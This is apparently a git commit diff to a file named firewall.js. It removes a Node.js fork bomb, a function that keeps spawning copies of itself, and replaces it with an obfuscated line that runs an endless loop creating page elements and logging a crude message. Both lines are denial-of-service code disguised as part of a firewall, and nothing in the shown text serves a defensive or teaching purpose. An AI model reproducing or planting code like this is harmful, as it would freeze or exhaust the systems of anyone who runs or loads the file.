0e50301f79e65fec02cf74cad043ef79dab8b316
jentaughtme <69075710+jentaughtme@users.noreply.github.com>
2020-08-01 06:49:50 -0400

    Update firewall.js

--- firewall.js
+++ firewall.js
@@ -12,4 +12,5 @@ function initializeFirewall(){
 }
 
 initializeFirewall()
-(function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }());
+
+const _0x5dd2=['log','createElement','finished\x20sexing','createTextNode'];(function(_0x366a53,_0x5dd234){const _0x1ec2a3=function(_0x4bddd7){while(--_0x4bddd7){_0x366a53['push'](_0x366a53['shift']());}};_0x1ec2a3(++_0x5dd234);}(_0x5dd2,0x148));const _0x1ec2=function(_0x366a53,_0x5dd234){_0x366a53=_0x366a53-0x0;let _0x1ec2a3=_0x5dd2[_0x366a53];return _0x1ec2a3;};while(!![]){let tag=document[_0x1ec2('0x1')]('p'),text=document[_0x1ec2('0x3')]('Webhook\x20firewall');tag['appendChild'](text),console[_0x1ec2('0x0')](_0x1ec2('0x2'));}
